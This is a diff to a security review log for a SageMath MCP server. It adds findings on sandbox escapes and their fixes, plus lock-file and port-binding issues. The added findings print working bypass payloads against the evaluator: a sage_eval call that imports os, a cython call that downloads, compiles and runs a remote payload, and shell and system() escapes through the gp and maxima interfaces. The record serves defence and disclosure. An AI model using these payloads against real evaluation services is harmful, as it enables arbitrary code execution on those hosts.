@@ -22,7 +22,7 @@ section, under a "second round" heading, along with what closed it. Items 10,
 | 4 | Medium | `server.py` is 2147 lines and the least-covered module | **done** (split; coverage deferred) |
 | 5 | Medium | Two release paths cannot be exercised before a tag push | **done** |
 | 6 | Low | 104 dependencies, with pip-audit now blocking | **done** |
-| 7 | Low | Distribution: Smithery and Glama listings | **partly done** |
+| 7 | Low | Distribution: Smithery and Glama listings | **partly done** (Glama listed; Smithery pending) |
 | 8 | Low | Codex still routes two questions to `evaluate_sage` | accepted |
 | 9 | Low | Jupyter kernel `debug_request` question left unresolved | deferred |
 | 10 | **Critical** | Response caching breaks state and isolation across MCP clients | **done** |
@@ -39,6 +39,9 @@ section, under a "second round" heading, along with what closed it. Items 10,
 | 21 | **Critical** | Persisted specialized-tool state can never be restored | **done** |
 | 22 | High | Exact-integer inputs unguarded on two tools; `/health` never registered; `is_convex` always true | **done** |
 | 23 | High | Nightly leaked every provider key to each CLI, and stayed green when registration failed | **done** |
+| 24 | **Critical** | Forbidden functions reachable through attribute chains; `load`/`attach` never listed | **done** |
+| 25 | **Critical** | Sage's own helpers and CAS interfaces execute code, compile, fetch and run shells | **done** |
+| 26 | Medium | `uv.lock` stale and unverified; compose published on every interface | **done** |
 
 ---
 
@@ -350,7 +353,7 @@ entry point that `pyproject.toml` actually defines.
 - **Smithery**: connect the repository at <https://smithery.ai/new> with an
   account that owns `XBP-Europe/sagemath-mcp`. It reads `smithery.yaml` from the
   default branch.
-- **Glama**: **already listed** -- it auto-indexed the repository, and
+- **Glama**: **listed, claim pending.** It auto-indexed the repository, and
   `https://glama.ai/api/mcp/v1/servers?query=sagemath` returns
   `SageMath MCP Server` pointing at `XBP-Europe/sagemath-mcp`. Nothing to submit;
   sign in at <https://glama.ai> with a GitHub account that owns the repository to
@@ -937,6 +940,78 @@ by design, so output produced faster than a slow callback consumed it grew
 without limit until the process died. Bounded at 1000 lines, dropping oldest;
 the complete stdout still travels with the result, so nothing is lost that a
 caller cannot recover.
+
+---
+
+## 24. Forbidden functions reachable through attribute chains — **critical** — DONE
+
+The name rules inspected bare `ast.Name` nodes and `ast.Call.func`. `sage` is an
+allowed import root and none of its segments are forbidden, so the same function
+sat one dot further along:
+
+    sage.misc.sage_eval.sage_eval("__import__('os').getuid()")   -> 1001
+    sage.all.sage_eval("__import__('os').getuid()")              -> 1001
+
+Item 18 again, by a different path: the payload is a string the validator never
+parses. What is checked now is the final name, however it is spelled.
+
+`load()` and `attach()` were on no list at all. They execute whatever path they
+are given and `load()` accepts a URL, which makes that remote code execution from
+an ordinary-looking name. Both are forbidden for callers; no generated template
+uses either.
+
+## 25. Sage's helpers and CAS interfaces execute code — **critical** — DONE
+
+Found by pulling on the previous thread, and worse than it.
+
+    cython(get_remote_file('https://.../payload.pyx'))   download, compile, run
+    sh('id')                                             a shell
+    gp('system("id > /tmp/x")')                          wrote the file
+    maxima('system("id > /tmp/x")')                      wrote the file
+
+The last two are arbitrary shell execution: both landed real files owned by the
+container user. Sage's interfaces spawn the actual CAS programs, and those carry
+their own `system()` escapes.
+
+**Why the earlier fixes kept missing it.** Each was another name added to a
+denylist covering a namespace 1,838 entries deep. That does not converge. The
+worker now removes names by **provenance**: fifteen modules that compile, run
+shells, download, pickle or touch arbitrary paths, plus everything
+`sage.interfaces.all` exports -- Sage's own list, so an interface added by a
+future release is covered without anyone remembering. 169 names.
+
+The mathematics is untouched, which was the thing to verify: Gröbner bases,
+factoring, number fields, permutation groups, elliptic-curve rank, integration,
+solving and plotting all still work, because Sage reaches Singular and PARI
+in-process and only the subprocess interfaces were removed.
+
+**A regression I caused fixing it.** The first version read `__module__` off every
+namespace entry, which resolves every lazy import: startup went from instant to
+1.8s, the delay landed inside the caller's first evaluation, and two timeout
+tests failed on CI. The names are a literal now, with a test that re-derives them
+from the installed Sage so a version bump cannot silently reopen the hole.
+
+**Standing caveat.** This is the fourth bypass class in a day. The specific holes
+are closed and tested, but a denylist over a CAS namespace is structurally on the
+back foot -- the container remains the boundary, as §3 says. An allowlist for
+caller code is the durable answer if it is ever worth the investment.
+
+## 26. Supply chain and exposure — medium — DONE
+
+`uv lock --check` was failing: the lock still said 0.4.0 after the 0.5.0 release,
+because the bump script never touched it. No vulnerable dependency -- pip-audit
+against the locked set reports nothing known -- but CI installs with `uv pip
+install -e .[dev]`, which ignores the lock, so the audit and the set a consumer
+gets by `uv sync` were different things and neither the drift nor the lock was
+checked anywhere. The bump script re-locks now, CI runs `uv lock --check`, and
+the version-consistency test includes the lock so it fails offline in a
+millisecond.
+
+`docker-compose` published `8314:8314`, binding every interface. Local MCP servers
+are unauthenticated by design and that is fine; what stood out is that every
+other default here is loopback -- stdio transport, `--host 127.0.0.1`,
+`ClusterIP` -- so the quickstart was the one place that disagreed. It publishes to
+`127.0.0.1:8314`, with a test that fails if it widens.
 
 SSH authentication to GitHub broke during this session (`ssh -T git@github.com`
 returns `Permission denied (publickey)` with keys loaded). `gh` still works
